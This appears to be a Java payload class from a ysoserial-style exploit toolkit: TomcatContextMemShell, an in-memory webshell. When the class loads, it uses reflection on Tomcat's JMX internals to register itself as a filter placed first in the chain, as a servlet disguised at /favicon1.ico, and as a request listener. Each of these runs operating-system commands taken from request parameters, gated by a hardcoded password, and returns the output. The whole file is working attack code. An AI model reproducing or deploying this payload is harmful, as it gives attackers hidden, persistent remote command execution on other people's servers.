package ysoserial.payloads;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.sun.jmx.mbeanserver.NamedObject;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;

public class TomcatContextMemShell extends HttpServlet implements ServletRequestListener, Filter {
    public String charSet = "GBK";
    public String pwd = "popko123";
    public String filterName = "ffilterShell";
    public String filterPath = "/*";
    public String servletPath = "/favicon1.ico";
    public String servletName = "sservletShell";

    static {
        TomcatContextMemShell ts = new TomcatContextMemShell();
        StandardContext sc = ts.getStandardContext();
        ts.regFilter(sc);
        ts.regServlet(sc);
        ts.regListener(sc);
    }

    public void regFilter(StandardContext standardContext) {
        try {
            java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
            //创建一个自定义的Filter马
            Filter ffilterShell = this;
            //添加filter马
            javax.servlet.FilterRegistration.Dynamic filterRegistration = standardContext.getServletContext().addFilter(filterName, ffilterShell);
            filterRegistration.setInitParameter("encoding", "utf-8");
            filterRegistration.setAsyncSupported(false);
            filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{filterPath});
            //状态恢复，要不然服务不可用
            if (stateField != null) {
                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
            }

            if (standardContext != null) {
                //生效filter
                standardContext.filterStart();
                //把filter插到第一位
                org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
                for (int i = 0; i < filterMaps.length; i++) {
                    if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) {
                        org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMap;
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void regServlet(StandardContext standardContext) {
        org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
        String n = servletName;
        newWrapper.setName(n);
        newWrapper.setLoadOnStartup(1);
        Servlet servlet = this;
        newWrapper.setServlet(servlet);
        newWrapper.setServletClass(servlet.getClass().getName());
        standardContext.addChild(newWrapper);
        standardContext.addServletMapping(servletPath, n);
//        standardContext.addServletMappingDecoded(servletPath, n, false);
    }

    public void regListener(StandardContext standardContext) {
        standardContext.addApplicationEventListener(this);
    }

    public StandardContext getStandardContext() {
        try {
            javax.management.MBeanServer mBeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            // 获取 mbsInterceptor
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
            // 获取 repository
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
            // 获取 domainTb
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String, Map<String, NamedObject>>) field.get(repository);
            // 获取 domain
            HashMap hashMap = (HashMap) (domainTb.get("Tomcat") != null ? domainTb.get("Tomcat") : domainTb.get("Catalina"));//内嵌为Tomcat
            Iterator it1 = hashMap.keySet().iterator();
            while (it1.hasNext()) {
                String key = (String) it1.next();
                if (key.indexOf("context=") != -1 && key.indexOf("host=") != -1 && key.indexOf("type=NamingResources") != -1) {
                    NamedObject nonLoginAuthenticator = (NamedObject) hashMap.get(key);
                    field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
                    field.setAccessible(true);
                    Object object = field.get(nonLoginAuthenticator);
                    // 获取 resource
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    Object resource = field.get(object);
                    // 获取 context
                    field = Class.forName("org.apache.catalina.deploy.NamingResourcesImpl").getDeclaredField("container");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(resource);
                    return standardContext;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public void getandout(String arg, ServletRequest request, ServletResponse response) {
        response.setContentType("text/html;charset=utf-8");
        try {
            PrintWriter out = response.getWriter();
            String cmd = request.getParameter(arg);
            if (request.getParameter(pwd) != null) {
                if (cmd != null) {
                    out.write(">" + arg + ":\n");
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(), charSet));
                    String line = null;
                    while ((line = bufferedReader.readLine()) != null) {
                        out.print(line + "\n");
                    }
                } else {
                    out.write(">please input: " + arg + "\n");
                }
            } else {
                out.write(">pwd error...");
            }
        } catch (Exception e) {
            //e.printStackTrace();
        }
    }

    protected void service(HttpServletRequest request, HttpServletResponse response) {
        String arg = "servlet_cmd";
        getandout(arg, request, response);
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String arg = "listener_cmd";
        RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
        try {
            Field field = requestFacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Object request = field.get(requestFacade);
            Field field1 = request.getClass().getDeclaredField("response");
            field1.setAccessible(true);
            Response response = (Response) field1.get(request);
            getandout(arg, (HttpServletRequest) request, response);
        } catch (Exception e) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String arg = "filter_cmd";
        getandout(arg, request, response);
        chain.doFilter(request, response);
    }
}

